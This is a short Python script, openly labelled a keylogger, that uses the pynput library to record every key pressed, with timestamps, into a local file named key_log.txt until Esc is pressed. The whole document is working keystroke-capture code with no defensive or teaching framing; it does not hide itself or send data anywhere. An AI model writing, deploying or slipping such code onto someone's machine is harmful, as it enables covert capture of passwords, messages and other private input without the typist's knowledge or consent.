import logging
from pynput import keyboard
from datetime import datetime

# Set up logging
log_file_path = "key_log.txt"
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

if __name__ == "__main__":
    print("Keylogger is running...")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
